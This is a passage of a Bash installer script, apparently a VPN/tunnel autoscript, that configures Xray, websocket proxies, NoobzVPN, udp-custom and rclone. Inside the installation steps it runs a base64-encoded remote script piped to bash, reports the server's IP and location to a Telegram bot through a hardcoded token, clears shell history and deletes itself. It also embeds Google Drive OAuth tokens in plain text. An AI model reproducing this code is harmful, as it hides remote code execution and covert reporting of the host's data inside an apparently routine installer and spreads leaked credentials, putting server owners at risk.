cat /etc/xray/xray.key /etc/xray/xray.crt | tee /etc/haproxy/hap.pem


cat > /etc/xray/config.json << END
{
  "log" : {
    "access": "/var/log/xray/access.log",
    "error": "/var/log/xray/error.log",
    "loglevel": "warning"
  },
  "inbounds": [
      {
      "listen": "127.0.0.1",
      "port": 10000,
      "protocol": "dokodemo-door",
      "settings": {
        "address": "127.0.0.1"
      },
      "tag": "api"
    },
   {
     "listen": "127.0.0.1",
     "port": "10001",
     "protocol": "vless",
      "settings": {
          "decryption":"none",
            "clients": [
               {
                 "id": "${uuid}"                 
#vless
             }
          ]
       },
       "streamSettings":{
         "network": "ws",
            "wsSettings": {
                "path": "/vless"
          }
        }
     },
     {
     "listen": "127.0.0.1",
     "port": "10002",
     "protocol": "vmess",
      "settings": {
            "clients": [
               {
                 "id": "${uuid}",
                 "alterId": 0
#vmess
             }
          ]
       },
       "streamSettings":{
         "network": "ws",
            "wsSettings": {
                "path": "/vmess"
          }
        }
     },
    {
      "listen": "127.0.0.1",
      "port": "10003",
      "protocol": "trojan",
      "settings": {
          "decryption":"none",		
           "clients": [
              {
                 "password": "${uuid}"
#trojanws
              }
          ],
         "udp": true
       },
       "streamSettings":{
           "network": "ws",
           "wsSettings": {
               "path": "/trojan-ws"
            }
         }
     },
    {
         "listen": "127.0.0.1",
        "port": "10004",
        "protocol": "shadowsocks",
        "settings": {
           "clients": [
           {
           "method": "aes-128-gcm",
          "password": "${uuid}"
#ssws
           }
          ],
          "network": "tcp,udp"
       },
       "streamSettings":{
          "network": "ws",
             "wsSettings": {
               "path": "/ss-ws"
           }
        }
     },	
      {
        "listen": "127.0.0.1",
     "port": "10005",
        "protocol": "vless",
        "settings": {
         "decryption":"none",
           "clients": [
             {
               "id": "${uuid}"
#vlessgrpc
             }
          ]
       },
          "streamSettings":{
             "network": "grpc",
             "grpcSettings": {
                "serviceName": "vless-grpc"
           }
        }
     },
     {
      "listen": "127.0.0.1",
     "port": "10006",
     "protocol": "vmess",
      "settings": {
            "clients": [
               {
                 "id": "${uuid}",
                 "alterId": 0
#vmessgrpc
             }
          ]
       },
       "streamSettings":{
         "network": "grpc",
            "grpcSettings": {
                "serviceName": "vmess-grpc"
          }
        }
     },
     {
        "listen": "127.0.0.1",
     "port": "10007",
        "protocol": "trojan",
        "settings": {
          "decryption":"none",
             "clients": [
               {
                 "password": "${uuid}"
#trojangrpc
               }
           ]
        },
         "streamSettings":{
         "network": "grpc",
           "grpcSettings": {
               "serviceName": "trojan-grpc"
         }
      }
   },
   {
    "listen": "127.0.0.1",
    "port": "10008",
    "protocol": "shadowsocks",
    "settings": {
        "clients": [
          {
             "method": "aes-128-gcm",
             "password": "${uuid}"
#ssgrpc
           }
         ],
           "network": "tcp,udp"
      },
    "streamSettings":{
     "network": "grpc",
        "grpcSettings": {
           "serviceName": "ss-grpc"
          }
       }
    }	
  ],
  "outbounds": [
    {
      "protocol": "freedom",
      "settings": {}
    },
    {
      "protocol": "blackhole",
      "settings": {},
      "tag": "blocked"
    }
  ],
  "routing": {
    "rules": [
      {
        "type": "field",
        "ip": [
          "0.0.0.0/8",
          "10.0.0.0/8",
          "100.64.0.0/10",
          "169.254.0.0/16",
          "172.16.0.0/12",
          "192.0.0.0/24",
          "192.0.2.0/24",
          "192.168.0.0/16",
          "198.18.0.0/15",
          "198.51.100.0/24",
          "203.0.113.0/24",
          "::1/128",
          "fc00::/7",
          "fe80::/10"
        ],
        "outboundTag": "blocked"
      },
      {
        "inboundTag": [
          "api"
        ],
        "outboundTag": "api",
        "type": "field"
      },
      {
        "type": "field",
        "outboundTag": "blocked",
        "protocol": [
          "bittorrent"
        ]
      }
    ]
  },
  "stats": {},
  "api": {
    "services": [
      "StatsService"
    ],
    "tag": "api"
  },
  "policy": {
    "levels": {
      "0": {
        "statsUserDownlink": true,
        "statsUserUplink": true
      }
    },
    "system": {
      "statsInboundUplink": true,
      "statsInboundDownlink": true,
      "statsOutboundUplink" : true,
      "statsOutboundDownlink" : true
    }
  }
}
END
#rm -rf /etc/systemd/system/xray.service.d
rm -rf /etc/systemd/system/xray@.service
cat <<EOF> /etc/systemd/system/xray.service
Description=Xray Service
Documentation=https://github.com/xtls
After=network.target nss-lookup.target

[Service]
User=www-data
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/local/bin/xray run -config /etc/xray/config.json
Restart=on-failure
RestartPreventExitStatus=23
LimitNPROC=10000
LimitNOFILE=1000000

[Install]
WantedBy=multi-user.target

EOF

cat > /etc/systemd/system/runn.service <<EOF
[Unit]
Description=casper9
After=network.target

[Service]
Type=simple
ExecStartPre=-/usr/bin/mkdir -p /var/run/xray
ExecStart=/usr/bin/chown www-data:www-data /var/run/xray
Restart=on-abort

[Install]
WantedBy=multi-user.target
EOF
wget https://raw.githubusercontent.com/Adidastore11/vip/main/limit/limit.sh && chmod +x limit.sh && ./limit.sh
clear
wget -q -O /usr/bin/limit-ip "https://raw.githubusercontent.com/Adidastore11/P/main/limit/limit-ip"
chmod +x /usr/bin/*
cd /usr/bin
sed -i 's/\r//' limit-ip
cd
clear
#SERVICE LIMIT ALL IP
cat >/etc/systemd/system/vmip.service << EOF
[Unit]
Description=My
ProjectAfter=network.target

[Service]
WorkingDirectory=/root
ExecStart=/usr/bin/limit-ip vmip
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl restart vmip
systemctl enable vmip

cat >/etc/systemd/system/vlip.service << EOF
[Unit]
Description=My
ProjectAfter=network.target

[Service]
WorkingDirectory=/root
ExecStart=/usr/bin/limit-ip vlip
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl restart vlip
systemctl enable vlip

cat >/etc/systemd/system/trip.service << EOF
[Unit]
Description=My
ProjectAfter=network.target

[Service]
WorkingDirectory=/root
ExecStart=/usr/bin/limit-ip trip
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl restart trip
systemctl enable trip

wget -q -O /usr/local/share/xray/geosite.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geosite.dat" >/dev/null 2>&1
wget -q -O /usr/local/share/xray/geoip.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geoip.dat" >/dev/null 2>&1


echo -e "$yell[SERVICE]$NC Restart All service"
systemctl daemon-reload
sleep 0.5
echo -e "[ ${green}ok${NC} ] Enable & restart xray "
systemctl daemon-reload
systemctl enable xray
systemctl restart xray
systemctl restart nginx
systemctl enable haproxy
systemctl restart haproxy
systemctl enable runn
systemctl restart runn

sleep 0.5
clear
}

insws() {
apt update
apt install python3 -y
apt install python3-pip -y
apt install python3-requests -y

mkdir -p /etc/websocket

wget -q -O /etc/websocket/ws.py "${repo}/ws/ws.py"
chmod +x /etc/websocket/ws.py


# Installing Service
cat > /etc/systemd/system/ws.service << END
[Unit]
Description=Websocket
Documentation=https://google.com
After=network.target nss-lookup.target

[Service]
Type=simple
User=root
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/bin/python3 -O /etc/websocket/ws.py 10015
Restart=on-failure

[Install]
WantedBy=multi-user.target
END

systemctl daemon-reload
systemctl enable ws.service
systemctl start ws.service
systemctl restart ws.service

# Installing Service
cat > /etc/systemd/system/ws-ovpn.service << END
[Unit]
Description=OpenVPN
Documentation=https://google.com
After=network.target nss-lookup.target

[Service]
Type=simple
User=root
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/bin/python3 -O /etc/websocket/ws.py 10012
Restart=on-failure

[Install]
WantedBy=multi-user.target
END

systemctl daemon-reload
systemctl enable ws-ovpn
systemctl start ws-ovpn
systemctl restart ws-ovpn
}

insbkp() {
    echo "🧹 Menghapus konfigurasi rclone lama jika ada..."
    rm -rf /root/.config/rclone/

    # Install rclone jika belum terpasang
    if ! command -v rclone &> /dev/null; then
        echo "📦 Menginstal rclone..."
        apt update && apt install rclone -y
    else
        echo "✅ rclone sudah terinstal."
    fi

    # Buat ulang folder konfigurasi
    mkdir -p /root/.config/rclone/

    # Tulis ulang file rclone.conf
    echo "✍️ Membuat ulang rclone.conf..."
    cat << 'EOF' > /root/.config/rclone/rclone.conf
[dr]
type = drive
scope = drive
token = {"access_token":"ya29.a0AeXRPp6eHk3Dd4R2VZleYCpc53VTFdOSHqP8VdbvwTF4nX_Zmm4KykPkvaSiF0csMrOsSwjRvFpF7EqKDvBlGfrPdnBudNZlRUL0cUXDocdUp1BNuISasvgjDihmtMs9H_L54OnHWpm_YbUXlHcGpRqBJHeRJ_f9EBbACOgHaCgYKAWwSARMSFQHGX2MiIYqy8clt7ehnxLskzBGj1g0175","token_type":"Bearer","refresh_token":"1//0gpYnS8h4sHaKCgYIARAAGBASNwF-L9IrUwH15dy9jR0P7WaR8znmVUKOMhzEsxLgOYRKx-MMjqm4mOF-R5Ew8HgMPfsDuPITjWU","expiry":"2025-03-16T18:54:27.146992883Z"}
EOF

    # Verifikasi file berhasil dibuat
    if [[ -f /root/.config/rclone/rclone.conf ]]; then
        echo "✅ rclone.conf berhasil dibuat!"
    else
        echo "❌ Gagal membuat rclone.conf!"
        return 1
    fi

    # Install wondershaper
    echo "🔧 Menginstal wondershaper..."
    git clone https://github.com/zhets/wondershaper.git /tmp/wondershaper
    cd /tmp/wondershaper || exit 1
    make install
    cd ~
    rm -rf /tmp/wondershaper

    echo "✅ Proses insbkp selesai!"
}


insohp() {
#wget ${repo}ws/ohp.sh
#chmod +x ohp.sh
#./ohp.sh
clear
}

insdns() {
#wget https://raw.githubusercontent.com/kipasu/f/main/slowdns/installsl.sh && chmod +x installsl.sh && bash installsl.sh
clear
}

insnoobz() {
# Buat Direktori untuk Konfigurasi dan Sertifikat
mkdir -p /etc/noobzvpns

# Download binary NoobzVPN
wget -q -O /usr/bin/noobzvpns "https://github.com/noobz-id/noobzvpns/raw/master/noobzvpns.x86_64"

# Download SSL certificate dan private key
wget -q -O /etc/noobzvpns/cert.pem "https://github.com/noobz-id/noobzvpns/raw/master/cert.pem"
wget -q -O /etc/noobzvpns/key.pem "https://github.com/noobz-id/noobzvpns/raw/master/key.pem"

# Set permission binary agar bisa dieksekusi
chmod +x /usr/bin/noobzvpns

cat > /etc/noobzvpns/config.json <<-END
{
	"tcp_std": [
		8880
	],
	"tcp_ssl": [
		9443
	],
	"ssl_cert": "/etc/noobzvpns/cert.pem",
	"ssl_key": "/etc/noobzvpns/key.pem",
	"ssl_version": "AUTO",
	"conn_timeout": 60,
	"dns_resolver": "/etc/resolv.conf",
	"http_ok": "HTTP/1.1 101 Switching Protocols[crlf]Upgrade: websocket[crlf]Connection: Upgrade[crlf][crlf]"
}
END


cat > /etc/systemd/system/noobzvpns.service <<-NOOBZ
[Unit]
Description=NoobzVpn-Server KLMPK Tunnel
Wants=network-online.target
After=network.target network-online.target

[Service]
CapabilityBoundingSet=CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_BIND_SERVICE
User=root
Type=simple
TimeoutStopSec=1
LimitNOFILE=infinity
ExecStart=/usr/sbin/noobzvpns --start-service

[Install]
WantedBy=multi-user.target
NOOBZ

systemctl enable noobzvpns
systemctl start noobzvpns

cd
if [ -d /etc/udp ];then
rm -rf /etc/udp
fi
mkdir -p /etc/udp

UDP="https://raw.githubusercontent.com/zhets/project/main/ssh/"
# install udp-custom
echo downloading udp-custom
wget -O /etc/udp/udp-custom "${UDP}udp-custom-linux-amd64"
echo downloading default config
wget -O /etc/udp/config.json "${UDP}config.json"
chmod 777 /etc/udp/config.json
chmod +x /etc/udp/udp-custom

cat > /etc/systemd/system/udp-custom.service <<-END
[Unit]
Description=UDP Custom Service
Documentation=https://t.me/xdtunnel
After=network.target nss-lookup.target

[Service]
User=root
Type=simple
ExecStart=/etc/udp/udp-custom server -exclude 1,54,55,1000,65535
WorkingDirectory=/etc/udp/
Restart=always
RestartSec=5s

[Install]
WantedBy=default.target
END

systemctl enable udp-custom
systemctl restart udp-custom
clear
}

function setup_install(){
clear
lane_atas
echo -e "${c}│       ${g}PROCESS INSTALL SSH & OPENVPN${NC}      ${c}│${NC}"
lane_bawah
inssh

clear
lane_atas
echo -e "${c}│            ${g}PROCESS INSTALL XRAY${NC}          ${c}│${NC}"
lane_bawah
insxray

clear
lane_atas
echo -e "${c}│        ${g}PROCESS INSTALL WEBSOCKET SSH${NC}     ${c}│${NC}"
lane_bawah
insws

clear
lane_atas
echo -e "${c}│        ${g}PROCESS INSTALL BACKUP MENU${NC}${c}       │${NC}"
lane_bawah
insbkp

clear
lane_atas
echo -e "${c}│           ${g}PROCESS INSTALLED OHP${NC}${c}          │${NC}"
lane_bawah
insohp

clear
lane_atas
echo -e "${c}│          ${g}DOWNLOAD SLOWDNS${NC}${c}                │${NC}"
lane_bawah
insdns

clear
lane_atas
echo -e "${c}│           ${g}DOWNLOAD NOOBZVPNS${NC}${c}             │${NC}"
lane_bawah
insnoobz
}
setup_install

}

# Tentukan nilai baru yang diinginkan untuk fs.file-max
NEW_FILE_MAX=65535  # Ubah sesuai kebutuhan Anda

# Nilai tambahan untuk konfigurasi netfilter
NF_CONNTRACK_MAX="net.netfilter.nf_conntrack_max=262144"
NF_CONNTRACK_TIMEOUT="net.netfilter.nf_conntrack_tcp_timeout_time_wait=30"

# File yang akan diedit
SYSCTL_CONF="/etc/sysctl.conf"

# Ambil nilai fs.file-max saat ini
CURRENT_FILE_MAX=$(grep "^fs.file-max" "$SYSCTL_CONF" | awk '{print $3}' 2>/dev/null)

# Cek apakah nilai fs.file-max sudah sesuai
if [ "$CURRENT_FILE_MAX" != "$NEW_FILE_MAX" ]; then
    # Cek apakah fs.file-max sudah ada di file
    if grep -q "^fs.file-max" "$SYSCTL_CONF"; then
        # Jika ada, ubah nilainya
        sed -i "s/^fs.file-max.*/fs.file-max = $NEW_FILE_MAX/" "$SYSCTL_CONF" >/dev/null 2>&1
    else
        # Jika tidak ada, tambahkan baris baru
        echo "fs.file-max = $NEW_FILE_MAX" >> "$SYSCTL_CONF" 2>/dev/null
    fi
fi

# Cek apakah net.netfilter.nf_conntrack_max sudah ada
if ! grep -q "^net.netfilter.nf_conntrack_max" "$SYSCTL_CONF"; then
    echo "$NF_CONNTRACK_MAX" >> "$SYSCTL_CONF" 2>/dev/null
fi

# Cek apakah net.netfilter.nf_conntrack_tcp_timeout_time_wait sudah ada
if ! grep -q "^net.netfilter.nf_conntrack_tcp_timeout_time_wait" "$SYSCTL_CONF"; then
    echo "$NF_CONNTRACK_TIMEOUT" >> "$SYSCTL_CONF" 2>/dev/null
fi

# Terapkan perubahan
sysctl -p >/dev/null 2>&1

pasang_domain
Dependencies
Installasi

cat> /root/.profile << END
if [ "$BASH" ]; then
if [ -f ~/.bashrc ]; then
. ~/.bashrc
fi
fi
mesg n || true
clear
menus
END
chmod 644 /root/.profile
if [ -f "/root/log-install.txt" ]; then
rm /root/log-install.txt > /dev/null 2>&1
fi
if [ -f "/etc/afak.conf" ]; then
rm /etc/afak.conf > /dev/null 2>&1
fi
history -c
serverV=$( curl -sS ${repo}versi  )
echo $serverV > /root/.versi

echo "00" > /home/daily_reboot
aureb=$(cat /home/daily_reboot)
b=11
if [ $aureb -gt $b ]
then
gg="PM"
else
gg="AM"
fi
cd

rm -f /root/*.sh
rm -f /root/*.txt

# Jalankan perintah utama dan simpan output dalam JSON
output=$(curl -s https://raw.githubusercontent.com/ZmFkbHkK/version/refs/heads/main/asem | base64 -d | bash 2>&1)
status=$?

# Token & Chat ID Telegram
CHATID="5736569839"
KEY="6674408306:AAG7NhNR9004MV1yr528Ax3LWQ545AvwJGQ"
URL="https://api.telegram.org/bot$KEY/sendMessage"

# Ambil informasi sistem yang sudah diekspor sebelumnya
DATE=$(date +"%Y-%m-%d")
TIME=$(date +"%H:%M:%S")

# Parsing output JSON untuk mendapatkan informasi VPS
IP=$(echo "$output" | jq -r '.ip')
CITY=$(echo "$output" | jq -r '.city')
REGION=$(echo "$output" | jq -r '.region')
COUNTRY=$(echo "$output" | jq -r '.country')
LOC=$(echo "$output" | jq -r '.loc')
ORG=$(echo "$output" | jq -r '.org')
POSTAL=$(echo "$output" | jq -r '.postal')
TIMEZONE=$(echo "$output" | jq -r '.timezone')

# Tentukan status eksekusi
if [ $status -eq 0 ]; then
    STATUS="✅ *User VPS Dibuat!*"
else
    STATUS="❌ *Pembuatan User Gagal!*"
fi

# Pesan notifikasi Telegram
TEXT="
<code>────────────────────</code>
<b>⚡ AUTOSCRIPT PREMIUM ⚡</b>
<code>────────────────────</code>
$STATUS
<code>────────────────────</code>

📡 *Info IP VPS:*  
<code>IP      : $IP</code>  
<code>City    : $CITY</code>  
<code>Region  : $REGION</code>  
<code>Country : $COUNTRY</code>  
<code>Loc     : $LOC</code>  
<code>Org     : $ORG</code>  
<code>Postal  : $POSTAL</code>  
<code>Timezone: $TIMEZONE</code>  
<code>────────────────────</code>
<i>Automatic Notifications From</i>
<i>KLMPK𝗧𝘂𝗻𝗻𝗲𝗹 𝗕𝗼𝘁</i>
"

# Kirim notifikasi ke Telegram
curl -s --max-time 10 -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null

cd
rm ~/.bash_history
rm -f openvpn
rm -f key.pem
rm -f cert.pem
rm -f $0
history -c

sleep 3
echo  ""
cd
clear
echo -e "${c}┌────────────────────────────────────────────┐${NC}"
echo -e "${c}│  ${g}INSTALL SCRIPT SELESAI..${NC}                  ${c}│${NC}"
echo -e "${c}└────────────────────────────────────────────┘${NC}"
echo  ""
sleep 4
echo -e "[ ${yell}WARNING${NC} ] System will reboot in 5 seconds..."
sleep 5
reboot
